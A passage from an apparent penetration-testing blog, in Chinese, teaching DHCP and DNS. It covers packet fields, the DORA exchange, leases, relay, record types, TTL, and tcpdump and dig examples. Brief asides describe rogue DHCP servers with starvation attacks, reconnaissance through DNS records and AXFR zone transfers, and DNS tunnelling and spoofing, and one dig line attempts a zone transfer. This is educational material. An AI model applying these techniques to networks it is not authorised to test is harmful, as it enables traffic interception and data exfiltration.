class="emphasis">CIDR（斜杠记法）例：192.168.0.1/24 == C类地址  掩码：255.255.255.0</span></span><br><span class="line"><span class="emphasis">代替了传统ABC类编址</span></span><br><span class="line"><span class="emphasis">VLSM（可变长子网划分） -- 案例二就是采用VLSM</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/04/04/network-basic/2026-04-04-dhcp-dns/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/04/network-basic/2026-04-04-dhcp-dns/" class="post-title-link" itemprop="url">网络通讯协议—DHCP-DNS</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-04 22:00:00" itemprop="dateCreated datePublished" datetime="2026-04-04T22:00:00+08:00">2026-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-15 11:27:12" itemprop="dateModified" datetime="2026-10-15T11:27:12+08:00">2026-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/DHCP-DNS/" itemprop="url" rel="index"><span itemprop="name">DHCP-DNS</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="1-0-DHCP"><a href="#1-0-DHCP" class="headerlink" title="1.0 DHCP"></a>1.0 DHCP</h2><p>一台主机接入网络后要能正常通信，至少需要四样参数：IP 地址、子网掩码、默认网关、DNS 服务器地址。几台机器手工配置没有问题，几十上百台机器的网络里无法维护，换一个网段就要全部重配一遍。DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）把这四样参数连同租期一起自动下发。</p>
+<p>DHCP 工作在应用层，基于 UDP：服务端使用 67 端口，客户端使用 68 端口。协议由 BOOTP 扩展而来，因此在抓包工具里过滤 DHCP 报文要使用 <code>bootp</code> 过滤器而不是 <code>dhcp</code>。</p>
+<h3 id="1-1-报文格式"><a href="#1-1-报文格式" class="headerlink" title="1.1 报文格式"></a>1.1 报文格式</h3><p>DHCP 报文分成两段：固定长度的头部，以及可变长的选项字段。</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>长度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OP</td>
+<td>1字节</td>
+<td>报文类型，1 &#x3D; 请求，2 &#x3D; 应答</td>
+</tr>
+<tr>
+<td>HTYPE</td>
+<td>1字节</td>
+<td>硬件类型，以太网为 1</td>
+</tr>
+<tr>
+<td>HLEN</td>
+<td>1字节</td>
+<td>硬件地址长度，以太网 MAC 为 6</td>
+</tr>
+<tr>
+<td>HOPS</td>
+<td>1字节</td>
+<td>经过的 DHCP 中继跳数，客户端置 0，每经过一个中继加 1，用来防止环回</td>
+</tr>
+<tr>
+<td>XID</td>
+<td>4字节</td>
+<td>事务 ID，客户端随机生成，用来把请求与应答配对</td>
+</tr>
+<tr>
+<td>SECS</td>
+<td>2字节</td>
+<td>客户端从开始申请到此刻经过的秒数</td>
+</tr>
+<tr>
+<td>FLAGS</td>
+<td>2字节</td>
+<td>最高位置 1 表示要求服务端以广播方式应答</td>
+</tr>
+<tr>
+<td>CIADDR</td>
+<td>4字节</td>
+<td>客户端已有的 IP 地址，首次申请时为 0.0.0.0</td>
+</tr>
+<tr>
+<td>YIADDR</td>
+<td>4字节</td>
+<td>服务端分配给客户端的 IP 地址</td>
+</tr>
+<tr>
+<td>SIADDR</td>
+<td>4字节</td>
+<td>下一个为客户端提供服务的服务器地址</td>
+</tr>
+<tr>
+<td>GIADDR</td>
+<td>4字节</td>
+<td>中继代理的地址，跨网段时由中继填入</td>
+</tr>
+<tr>
+<td>CHADDR</td>
+<td>16字节</td>
+<td>客户端硬件地址，即网卡 MAC</td>
+</tr>
+<tr>
+<td>SNAME</td>
+<td>64字节</td>
+<td>服务器名称，可选</td>
+</tr>
+<tr>
+<td>FILE</td>
+<td>128字节</td>
+<td>启动文件名，无盘工作站网卡启动时使用</td>
+</tr>
+<tr>
+<td>Options</td>
+<td>可变</td>
+<td>以魔术字 0x63825363 开始，所有实际参数都在这里</td>
+</tr>
+</tbody></table>
+<p>头部只规定了地址填在哪一格，真正决定下发什么参数的是 Options。</p>
+<table>
+<thead>
+<tr>
+<th>选项码</th>
+<th>名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DHCP Message Type</td>
+<td>报文类型，决定这条报文是 DISCOVER &#x2F; OFFER &#x2F; REQUEST &#x2F; ACK 中的哪一种</td>
+</tr>
+<tr>
+<td>50</td>
+<td>Requested IP Address</td>
+<td>客户端希望申请的地址</td>
+</tr>
+<tr>
+<td>54</td>
+<td>Server Identifier</td>
+<td>客户端选中的服务器地址</td>
+</tr>
+<tr>
+<td>51</td>
+<td>IP Address Lease Time</td>
+<td>租期</td>
+</tr>
+<tr>
+<td>58</td>
+<td>Renewal (T1) Time</td>
+<td>续约时间点</td>
+</tr>
+<tr>
+<td>59</td>
+<td>Rebinding (T2) Time</td>
+<td>重绑时间点</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Subnet Mask</td>
+<td>子网掩码</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Router</td>
+<td>默认网关，可以下发多个</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Domain Name Server</td>
+<td>DNS 服务器地址</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Domain Name</td>
+<td>域名，用于把无后缀的主机名补全</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-交互过程"><a href="#1-2-交互过程" class="headerlink" title="1.2 交互过程"></a>1.2 交互过程</h3><p>首次获取地址要交换四条报文，取首字母简称 DORA。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一次: DHCP DISCOVER   客户端 ==&gt; 服务端</span></span><br><span class="line"><span class="comment"># 客户端此刻还没有 IP，只能以 0.0.0.0 为源地址，向广播地址发送</span></span><br><span class="line">源IP = 0.0.0.0                    源端口 = 68</span><br><span class="line">目的IP = 255.255.255.255          目的端口 = 67</span><br><span class="line">源MAC = 客户端自己的 MAC          目的MAC = ff:ff:ff:ff:ff:ff</span><br><span class="line">Options 53 = 1</span><br><span class="line"><span class="comment"># 含义：谁有可用的地址，给我一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次: DHCP OFFER   服务端 ==&gt; 客户端</span></span><br><span class="line"><span class="comment"># 服务端从地址池里挑一个尚未分配的地址，连同参数一起回复</span></span><br><span class="line">源IP = 服务端 IP</span><br><span class="line">目的IP = 255.255.255.255（FLAGS 最高位置 1 时）或客户端待分配地址</span><br><span class="line">Options 53 = 2</span><br><span class="line">YIADDR = 预分配给客户端的 IP</span><br><span class="line">Options 51 = 租期</span><br><span class="line"><span class="comment"># 含义：这个地址可以先给你用</span></span><br><span class="line"><span class="comment"># 同一网段里存在多台 DHCP 服务器时，客户端会收到多个 OFFER</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三次: DHCP REQUEST   客户端 ==&gt; 服务端</span></span><br><span class="line"><span class="comment"># 仍然使用广播，不是单播</span></span><br><span class="line">目的IP = 255.255.255.255</span><br><span class="line">Options 53 = 3</span><br><span class="line">Options 50 = 客户端选中的那个地址</span><br><span class="line">Options 54 = 客户端选中的那台服务器地址</span><br><span class="line"><span class="comment"># 含义：我要这个地址，由这台服务器提供</span></span><br><span class="line"><span class="comment"># 之所以广播而不是单播给中选的服务器，是为了让其余发了 OFFER 的服务器也收到，</span></span><br><span class="line"><span class="comment"># 它们看到 Options 54 不是自己，就知道 OFFER 被拒绝，把预分配的地址收回地址池</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四次: DHCP ACK   服务端 ==&gt; 客户端</span></span><br><span class="line">Options 53 = 5</span><br><span class="line">YIADDR = 正式分配给客户端的 IP</span><br><span class="line">Options 1 / 3 / 6 = 子网掩码 / 默认网关 / DNS 服务器</span><br><span class="line"><span class="comment"># 含义：确认，地址和参数归你使用</span></span><br><span class="line"><span class="comment"># 客户端拿到 ACK 后并不立即启用地址，会先以该地址为源和目的发两个免费 ARP，</span></span><br><span class="line"><span class="comment"># 探测网段内是否已有主机使用同一地址，没有应答才正式启用</span></span><br></pre></td></tr></table></figure>
+
+<p>除了这四条，还有三种报文。</p>
+<table>
+<thead>
+<tr>
+<th>报文</th>
+<th>Options 53</th>
+<th>方向</th>
+<th>触发场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DHCP NAK</td>
+<td>6</td>
+<td>服务端 → 客户端</td>
+<td>拒绝 REQUEST，例如申请的地址不在地址池内，或已经租给别的客户端。客户端收到后重新从 DISCOVER 开始</td>
+</tr>
+<tr>
+<td>DHCP DECLINE</td>
+<td>4</td>
+<td>客户端 → 服务端</td>
+<td>免费 ARP 检测到地址冲突，告知服务器这个地址不能用</td>
+</tr>
+<tr>
+<td>DHCP RELEASE</td>
+<td>7</td>
+<td>客户端 → 服务端</td>
+<td>客户端主动放弃地址，提前归还给地址池</td>
+</tr>
+</tbody></table>
+<p>DISCOVER 和 REQUEST 都用广播，原因是一致的：在拿到 ACK 之前，客户端并不知道自己会被分配哪个地址，也就无法用目的 IP 寻址，只能依赖二层广播送出，由网段内的主机接收后，再交给运行 DHCP 服务的进程判断是否处理。</p>
+<p><strong>引申</strong>：DHCP 协议本身没有任何认证机制，网段内任何一台主机都可以起一个 DHCP 服务并应答 DISCOVER。伪造的服务器只要抢先应答，就能把自己的地址作为网关和 DNS 下发，客户端之后的所有流量都先经过攻击者。为了确保抢到应答，攻击者通常先做 DHCP 饿死攻击（DHCP Starvation），用伪造源 MAC 的大量 DISCOVER 报文把真实服务器的地址池耗尽，此时伪造服务器就成了唯一应答方。企业网络里对应的防护是交换机端口的 DHCP Snooping，只信任连接合法服务器的那个端口。</p>
+<h3 id="1-3-租期与续约"><a href="#1-3-租期与续约" class="headerlink" title="1.3 租期与续约"></a>1.3 租期与续约</h3><p>DHCP 分配的是租期，不是永久占用。主机下线后如果地址一直被占着，地址池很快会不够用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 租期长度由 Options 51 下发</span></span><br><span class="line">Windows 客户端默认 8 天</span><br><span class="line">多数网络设备默认 1 天</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端在两个时间点发起续约，时间点由 Options 58 / 59 下发</span></span><br><span class="line">T1 = 租期的 50%    单播 REQUEST 给原服务器，请求延长租期</span><br><span class="line">T2 = 租期的 87.5%  广播 REQUEST，寻找任何一台能继续提供该地址的服务器</span><br><span class="line"></span><br><span class="line"><span class="comment"># 租期到期仍未收到 ACK</span></span><br><span class="line">客户端停止使用该地址，重新从 DISCOVER 开始申请</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-DHCP-中继"><a href="#1-4-DHCP-中继" class="headerlink" title="1.4 DHCP 中继"></a>1.4 DHCP 中继</h3><p>路由器不转发广播报文，而 DISCOVER 就是广播，因此 DHCP 服务器与客户端必须处在同一个广播域内。一栋楼有几十个网段，如果每一段都部署一台 DHCP 服务器，维护成本无法接受。</p>
+<p>DHCP 中继（Relay Agent）用来解决这个问题：网关设备在本地网段接收客户端的广播，转成单播发给远端 DHCP 服务器，同时把收到广播的那个接口地址写进 GIADDR 字段。服务器依据 GIADDR 判断客户端属于哪个网段，从对应的地址池里取地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">客户端(192.168.10.0/24) --广播--&gt; 网关(中继) --单播--&gt; DHCP服务器(10.0.0.100)</span><br><span class="line">                                      GIADDR = 192.168.10.1</span><br><span class="line"><span class="comment"># 服务器收到后查 GIADDR 对应的地址池，分配 192.168.10.0/24 的地址</span></span><br><span class="line"><span class="comment"># Cisco 设备上的配置：在客户端所在接口下写 ip helper-address &lt;DHCP服务器地址&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-抓包观察"><a href="#1-5-抓包观察" class="headerlink" title="1.5 抓包观察"></a>1.5 抓包观察</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux 抓取 DHCP 交互（网卡名以 ip a 的输出为准）</span></span><br><span class="line"><span class="built_in">sudo</span> tcpdump -i eth0 -nn -w dhcp.pcap <span class="string">&#x27;port 67 or port 68&#x27;</span></span><br><span class="line"><span class="comment"># 重置并重新申请，观察完整的 DORA</span></span><br><span class="line"><span class="built_in">sudo</span> dhclient -r eth0</span><br><span class="line"><span class="built_in">sudo</span> dhclient -v eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wireshark 过滤器</span></span><br><span class="line">bootp</span><br><span class="line">bootp.option.dhcp == 1     <span class="comment"># 只看 DISCOVER</span></span><br><span class="line">bootp.option.dhcp == 2     <span class="comment"># 只看 OFFER</span></span><br><span class="line">bootp.option.dhcp == 3     <span class="comment"># 只看 REQUEST</span></span><br><span class="line">bootp.option.dhcp == 5     <span class="comment"># 只看 ACK</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows 侧</span></span><br><span class="line">ipconfig /all              <span class="comment"># 看本机地址是 DHCP 获取还是静态配置，租期何时到期</span></span><br><span class="line">ipconfig /release          <span class="comment"># 释放当前地址</span></span><br><span class="line">ipconfig /renew            <span class="comment"># 重新申请</span></span><br></pre></td></tr></table></figure>
+
+<p>观察重点是 Options 53 的取值如何依次变化，以及 YIADDR 在哪一条报文里被填上。DISCOVER 的 XID 与后续三条完全一致，这是把它们串成一次完整交互的依据。</p>
+<h2 id="2-0-DNS"><a href="#2-0-DNS" class="headerlink" title="2.0 DNS"></a>2.0 DNS</h2><p>DHCP 下发的参数里有 DNS 服务器地址，因为人记不住 IP。DNS（Domain Name System，域名系统）负责把域名与地址对应起来。</p>
+<h3 id="2-1-域名结构"><a href="#2-1-域名结构" class="headerlink" title="2.1 域名结构"></a>2.1 域名结构</h3><p>域名是一棵树，从右往左逐级细化，各级之间用点分隔，最右边是通常省略的根。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www . example . com .</span><br><span class="line"> |      |       |</span><br><span class="line"> |      |       └── 顶级域 TLD</span><br><span class="line"> |      └────────── 二级域</span><br><span class="line"> └───────────────── 主机名 / 子域</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>根域用单个点表示，写作 <code>.</code></li>
+<li>顶级域分两类：通用顶级域 gTLD（com、net、org、edu）和国家地区顶级域 ccTLD（cn、jp、uk）</li>
+<li>每一级标签不超过 63 字节，完整域名不超过 253 字节</li>
+<li>域名不区分大小写</li>
+<li>写成 <code>www.example.com.</code> 时末尾那个点表示根，这种写法叫 FQDN（完全限定域名），配置文件里要求写全</li>
+</ul>
+<h3 id="2-2-查询过程"><a href="#2-2-查询过程" class="headerlink" title="2.2 查询过程"></a>2.2 查询过程</h3><p>DNS 查询分两种，区别在于谁去跑腿。</p>
+<ul>
+<li>递归查询：客户端向本地 DNS 服务器发出一次请求，服务器必须返回最终结果，不允许只回一句”下一步该问谁”</li>
+<li>迭代查询：本地 DNS 服务器向根、顶级域、权威服务器逐级询问，每一级返回的是”下一步该问谁”</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端 ==&gt; 本地DNS服务器：递归查询</span></span><br><span class="line"><span class="comment"># 客户端只发一次请求，然后等结果</span></span><br><span class="line"><span class="string">&quot;www.example.com 的 A 记录是什么？&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地DNS服务器 ==&gt; 各级服务器：迭代查询（本地缓存未命中时）</span></span><br><span class="line">问 根服务器        =&gt; 回: 我不知道，.com 的服务器地址是 x，下一步问它</span><br><span class="line">问 .com 服务器     =&gt; 回: 我不知道，example.com 的权威服务器地址是 y，下一步问它</span><br><span class="line">问 权威服务器      =&gt; 回: www.example.com 的 A 记录是 203.0.113.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地DNS服务器 ==&gt; 客户端：返回最终结果，并按 TTL 缓存下来</span></span><br></pre></td></tr></table></figure>
+
+<p>从在浏览器里敲下一个域名到真正发出请求，中间还会经过几层缓存和本地配置，全都未命中才会走到上面的迭代查询：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器 DNS 缓存 -&gt; 操作系统 DNS 缓存 -&gt; hosts 静态映射 -&gt; 本地DNS服务器缓存 -&gt; 迭代查询</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hosts 文件里的静态映射不经过网络，本地 DNS 服务器也无法覆盖它。Linux 在 <code>/etc/hosts</code>，Windows 在 <code>C:\Windows\System32\drivers\etc\hosts</code></li>
+<li>Linux 上本地 DNS 服务器的地址写在 <code>/etc/resolv.conf</code>，Windows 上执行 <code>ipconfig /all</code> 查看</li>
+<li>查询与应答默认走 UDP 53。应答长度超过 512 字节时会被截断（Flags 中 TC 位置 1），客户端改用 TCP 53 重新发送；区域传送（AXFR）和 DNSSEC 也必须使用 TCP</li>
+</ul>
+<h3 id="2-3-报文格式"><a href="#2-3-报文格式" class="headerlink" title="2.3 报文格式"></a>2.3 报文格式</h3><p>DNS 只有一种报文格式，靠 Flags 里的 QR 位区分查询和应答。</p>
+<p>头部长度固定 12 字节。</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>长度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ID</td>
+<td>2字节</td>
+<td>事务 ID，用来把查询与应答配对</td>
+</tr>
+<tr>
+<td>Flags</td>
+<td>2字节</td>
+<td>标志位，见下表</td>
+</tr>
+<tr>
+<td>QDCOUNT</td>
+<td>2字节</td>
+<td>问题段记录数</td>
+</tr>
+<tr>
+<td>ANCOUNT</td>
+<td>2字节</td>
+<td>回答段记录数</td>
+</tr>
+<tr>
+<td>NSCOUNT</td>
+<td>2字节</td>
+<td>权威段记录数</td>
+</tr>
+<tr>
+<td>ARCOUNT</td>
+<td>2字节</td>
+<td>附加段记录数</td>
+</tr>
+</tbody></table>
+<p>Flags 字段的各位：</p>
+<table>
+<thead>
+<tr>
+<th>位</th>
+<th>名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>QR</td>
+<td>查询&#x2F;应答</td>
+<td>0 &#x3D; 查询，1 &#x3D; 应答</td>
+</tr>
+<tr>
+<td>Opcode</td>
+<td>操作码</td>
+<td>0 &#x3D; 标准查询，5 &#x3D; 动态更新</td>
+</tr>
+<tr>
+<td>AA</td>
+<td>权威回答</td>
+<td>该应答来自本域的权威服务器</td>
+</tr>
+<tr>
+<td>TC</td>
+<td>截断</td>
+<td>应答超过 512 字节被截断，需要用 TCP 重发</td>
+</tr>
+<tr>
+<td>RD</td>
+<td>期望递归</td>
+<td>客户端置 1，要求服务器完成递归查询</td>
+</tr>
+<tr>
+<td>RA</td>
+<td>递归可用</td>
+<td>服务器置 1，表示自己支持递归</td>
+</tr>
+<tr>
+<td>RCODE</td>
+<td>返回码</td>
+<td>0 &#x3D; 成功，3 &#x3D; 域名不存在（NXDOMAIN），5 &#x3D; 拒绝</td>
+</tr>
+</tbody></table>
+<p>头部之后是四段，顺序固定：问题段（Question）、回答段（Answer）、权威段（Authority）、附加段（Additional）。问题段里是要查的名字加查询类型，回答段里是一条条资源记录，权威段在没有答案时用来指出谁才是权威，附加段携带 NS 与 MX 记录所指向主机的地址，省掉一次额外查询。</p>
+<h3 id="2-4-资源记录类型"><a href="#2-4-资源记录类型" class="headerlink" title="2.4 资源记录类型"></a>2.4 资源记录类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>用途</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A</td>
+<td>域名到 IPv4 地址，最常用</td>
+<td><code>www.example.com. 300 IN A 203.0.113.10</code></td>
+</tr>
+<tr>
+<td>AAAA</td>
+<td>域名到 IPv6 地址</td>
+<td><code>www.example.com. 300 IN AAAA 2001:db8::10</code></td>
+</tr>
+<tr>
+<td>CNAME</td>
+<td>别名，把域名指向另一个域名</td>
+<td><code>blog.example.com. 300 IN CNAME www.example.com.</code></td>
+</tr>
+<tr>
+<td>MX</td>
+<td>邮件交换记录，带优先级数字，数字越小越优先</td>
+<td><code>example.com. 3600 IN MX 10 mail.example.com.</code></td>
+</tr>
+<tr>
+<td>NS</td>
+<td>该域的权威 DNS 服务器</td>
+<td><code>example.com. 3600 IN NS ns1.example.com.</code></td>
+</tr>
+<tr>
+<td>PTR</td>
+<td>反向解析，由 IP 查域名，记录写在 in-addr.arpa 域下</td>
+<td><code>10.113.0.203.in-addr.arpa. 300 IN PTR www.example.com.</code></td>
+</tr>
+<tr>
+<td>SOA</td>
+<td>区域起始授权记录，描述区域的权威、序列号和各时间参数，每个区域有且只有一条</td>
+<td>通常与 NS 记录一同返回</td>
+</tr>
+<tr>
+<td>TXT</td>
+<td>文本记录，常用于 SPF、DKIM 和域名所有权验证</td>
+<td><code>example.com. 300 IN TXT &quot;v=spf1 include:...&quot;</code></td>
+</tr>
+<tr>
+<td>SRV</td>
+<td>服务定位，标明服务所在主机与端口</td>
+<td><code>_sip._tcp.example.com. 300 IN SRV 10 5 5060 sip.example.com.</code></td>
+</tr>
+<tr>
+<td>CAA</td>
+<td>指定允许为该域签发证书的 CA</td>
+<td><code>example.com. 300 IN CAA 0 issue &quot;letsencrypt.org&quot;</code></td>
+</tr>
+</tbody></table>
+<p><strong>引申</strong>：DNS 记录本身就是一份资产清单。NS 记录指出权威服务器，MX 记录指出邮件服务，TXT 记录里往往写着第三方服务的域名，CNAME 会暴露业务用了哪家的对象存储或 CDN。子域名爆破、证书透明日志查询，目的都是把这份清单补全。区域传送如果被错误放行，一次 AXFR 请求就能拿到整份记录。</p>
+<h3 id="2-5-缓存与-TTL"><a href="#2-5-缓存与-TTL" class="headerlink" title="2.5 缓存与 TTL"></a>2.5 缓存与 TTL</h3><p>资源记录里的那个数字就是 TTL。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.example.com. 300 IN A 203.0.113.10</span><br><span class="line">                 ^^^</span><br><span class="line">                 TTL，单位秒，表示这条记录允许被缓存多久</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>TTL 由该域名的权威服务器设定，本地 DNS 服务器和操作系统都按它缓存，缓存期内不再发起查询</li>
+<li>TTL 取小了（例如 60 秒），记录变更后生效快，代价是查询量上升；取大了（例如 86400 秒），查询量小，改完要等很久才全网生效</li>
+<li>查不到的域名也会被缓存。NXDOMAIN 的负缓存时长由 SOA 记录里的 minimum 字段决定</li>
+<li>改动本机 hosts 文件立即生效，但浏览器可能还有自己的一层缓存</li>
+</ul>
+<h3 id="2-6-查询工具"><a href="#2-6-查询工具" class="headerlink" title="2.6 查询工具"></a>2.6 查询工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nslookup，Windows 与 Linux 都自带</span></span><br><span class="line">nslookup www.example.com</span><br><span class="line">nslookup www.example.com 8.8.8.8      <span class="comment"># 指定向哪台 DNS 服务器查询</span></span><br><span class="line">nslookup -<span class="built_in">type</span>=mx example.com         <span class="comment"># 指定查询的记录类型</span></span><br><span class="line">nslookup -<span class="built_in">type</span>=ns example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># dig，Linux 下输出更完整</span></span><br><span class="line">dig www.example.com                   <span class="comment"># 完整返回，含头部标志位与各段内容</span></span><br><span class="line">dig www.example.com +short            <span class="comment"># 只输出结果</span></span><br><span class="line">dig @8.8.8.8 www.example.com A        <span class="comment"># 指定服务器与记录类型</span></span><br><span class="line">dig +trace www.example.com            <span class="comment"># 从根服务器开始，逐级显示迭代查询的每一步</span></span><br><span class="line">dig -x 8.8.8.8                        <span class="comment"># 反向查询 PTR 记录</span></span><br><span class="line">dig @ns1.example.com example.com AXFR <span class="comment"># 区域传送，配置正常时会被拒绝</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">ipconfig /displaydns                  <span class="comment"># 查看本机 DNS 缓存</span></span><br><span class="line">ipconfig /flushdns                    <span class="comment"># 清空本机 DNS 缓存</span></span><br></pre></td></tr></table></figure>
+
+<p><code>dig +trace</code> 的输出就是 2.2 节迭代查询流程的实际展开，逐级看到的 NS 记录就是那句”下一步该问谁”；<code>dig</code> 返回头部里的 <code>flags: qr rd ra</code> 正好对应 2.3 节 Flags 字段的各位。</p>
+<p><strong>引申</strong>：DNS 在渗透里还有一个方向是流量控制。DNS 查询几乎不会被出口防火墙拦下，把数据编码进查询名再发出去，就是一种能绕过访问管控的出网通道，也就是 DNS 隧道。反过来的方向是篡改，客户端拿到伪造的解析结果后就会连到攻击者的服务器上，这也是内网里伪造 DNS 服务器比伪造网关更隐蔽的原因。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/04/03/network-basic/2026-04-03-http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
